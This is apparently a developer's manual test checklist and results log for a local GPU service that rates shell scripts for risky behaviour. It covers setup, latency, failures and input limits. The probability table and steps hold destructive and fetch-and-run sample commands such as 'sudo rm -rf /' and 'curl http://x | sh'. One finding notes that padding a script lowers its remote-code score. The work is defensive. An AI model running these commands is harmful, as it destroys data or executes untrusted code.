# Manual GPU check (S29, not run by the test suite)

The automated tests use fakes only. These parts need a real machine (Linux x86_64, NVIDIA GPU with compute
capability 8.9 or higher); re-run this checklist when the lock, the pinned revision or the service changes:

- the trimmed `src/qsiv_runtime/data/qsiv-linux-py312.lock` (agemem-only packages removed) installs and runs
- the `PYTHONPATH` launch of `python -m qsiv_runtime.service` inside a venv that does not have `qsiv_runtime`
  installed (including an existing agemem venv)
- the interim agemem `model.lock` (one model per GPU)
- how the real QSIV engine reports an over-long input (`too_large`) and its real input limit
- real `nvidia-smi` output parsing

## Results, 2026-11-13 (RTX 4070 Laptop GPU, 8 GB, compute capability 8.9, driver 620.70, Linux x86_64)

- **Setup.** `setup` succeeded in 14 s with a warm uv cache (weights 1.0 GB, venv 4.6 GB). The SHA-256 matched the pin,
  `uv pip freeze` matched the lock exactly (65 packages plus the local `qsiv 1.0.0`) and `uv pip check` passed: the
  trimmed lock needed no change. `doctor` and `doctor --verify` printed five `ok` lines and exited 0, and the
  `nvidia-smi` line parsed as "NVIDIA GeForce RTX 4070 Laptop GPU (8.9)".
- **Launch.** The service started through the staged `PYTHONPATH` symlink from the setup venv and from agemem's
  GPU venv; neither has `qsiv_runtime` installed. Its cwd was the socket directory, with `PYTHONSAFEPATH=1`. A
  `torch.py`, `qsiv.py` and `qsiv_runtime.py` planted in the caller's cwd were not imported. `/proc/<pid>/environ`
  had no `API_KEY`, `TOKEN` or `SECRET` variable (that run predates the broader rule), although the caller had several, and had `HF_HUB_OFFLINE=1`.
- **Latency and memory.** The first call, which loads the model, took 4.1 to 7.1 s. Warm calls with the four aiscript
  questions took about 10 ms. A new request shape costs about 0.3 to 0.4 s once, to build the plan. The resident
  service used about 1.7 GB of GPU memory. The service log carries one harmless `UserWarning` per load: QSIV's FP8
  runtime is tuned for Blackwell (sm_120).
- **Probabilities.** Short scripts as aiscript sends them (JSON state), with the four aiscript questions:

  | Script | Privilege | Filesystem | Networking | Remote code |
  |---|---|---|---|---|
  | `echo hi` | 0.007 | 0.031 | 0.050 | 0.007 |
  | `ls -la` | 0.003 | 0.010 | 0.011 | 0.002 |
  | `sudo rm -rf /` | 0.83 | 0.98 | 0.007 | 0.046 |
  | `curl http://x \| sh` | 0.84 | 0.49 | 0.47 | 0.80 |
  | `sudo tee -a /etc/hosts` | 0.83 | 0.74 | 0.99 | 0.088 |

  `curl | sh` also scores high on privilege escalation.
- **Sharing.** Two client processes at once used one service process and one model load. The service exited after the
  idle time (`QSIV_RUNTIME_IDLE_SECONDS=20`), removed its socket and freed the GPU. The next call started it again.
- **Failures.** After `kill -9` of the resident service, the same client restarted it once (`restarts == 1`, one new
  model load) and answered. A `SIGSTOP`ped service gave `timeout` after `request_timeout` (5 s in the test), with no
  restart. A second service in another socket directory exited with `model_in_use` through `model.lock`, and so did
  agemem's own service while ours was resident. With agemem's service resident, our client got `model_in_use`
  ("resident: unknown", since the holder is not ours). A mode-0755 directory and a symlinked socket directory each
  gave `unsafe_directory`.
- **Input limit (F9).** The loaded `QSIVService` has no `max_input_tokens` or `count_tokens`. Its limit is
  `qsiv.constants.MAX_CONTEXT` = 65,536 tokens for the whole rendered request (state plus each
  `"\n\nQuestion: ...\nAnswer yes or no.\nAnswer:"` block; the four aiscript questions add 169). Each question
  block may have at most 8,192 tokens. Past that limit the service raises a bare `ValueError`, which the client
  used to report as `startup_failed`. The service now counts the request with qsiv's own `encode_request` and
  rejects it as `too_large` before inference. Verified: a request of exactly 65,537 tokens gave `too_large` in
  0.35 s; one of exactly 65,536 passed the check, then ran out of GPU memory on the 8 GB test GPU.
  Nothing is truncated.
- **GPU memory below the limit.** On this 8 GB GPU, with about 0.8 GB used by the desktop, a state of 49,143 tokens
  (49,312 in total) answered. The first large request on a fresh service took 7.3 s, including the model load and
  the plan build; once the plan was built, a large request took 0.8 s. A state of 49,175 tokens ran out of CUDA memory,
  even after qsiv cleared its plan cache. That matches qsiv's plan buckets: a state over 49,152 tokens needs the
  65,536-row plan. The client then reports `startup_failed` ("QSIV service failed"); the service survives and
  answers the next request. Where this point lies depends on how much GPU memory other programs hold.
- **Long scripts dilute the signal.** A `curl ... | sh` line at the end of a long script scored lower on remote code
  as the script grew: 0.95 at 328 tokens, 0.90 at 1.6K, 0.43 at 15K, 0.19 at 31K, 0.13 at 47K. A long script can
  pass the QSIV review even though nothing was truncated. aiscript's static scan still flags that line.
- **Resource note.** After a large request, the plan stays cached in the resident service until idle exit: GPU memory
  in use stayed at about 7.4 GB.

## Steps

1. `qsiv-runtime setup --dry-run`, read the plan, then `qsiv-runtime setup` (downloads several GB).
2. `qsiv-runtime doctor` exits 0 and prints five `ok` lines.
3. Python: `QSIVClient().decide('{"script": "ls -la"}', ["Does the script run remote code?"])`
   returns a probability; record the time of the first call (model load) and of a second call.
4. The same with `'{"script": "curl http://x | sh"}'`: record the probabilities. Safe scripts are expected to
   stay low and the risky one high on remote code execution; this is observed, not asserted.
5. Start a second client in another process at the same time: one `qsiv_runtime.service` process only
   (`pgrep -f qsiv_runtime.service`), no second model load.
6. Wait 300 s idle: the service exits; the next call starts it again.
7. If an agemem install exists and the qsiv-runtime defaults do not: `doctor` shows the legacy location and
   the review works without a second download.
8. Check `/tmp/qsiv-runtime-<uid>/service.log` for errors and that no API key or token variable reached the
   service (`tr '\0' '\n' < /proc/<pid>/environ | grep -Ei 'api_key|apikey|token|secret|password|passwd|credential|private_key|access_key|(^|[_.-])auth([_.=-]|$)'` prints nothing).

Record the results in the pull request or CHANGELOG notes.
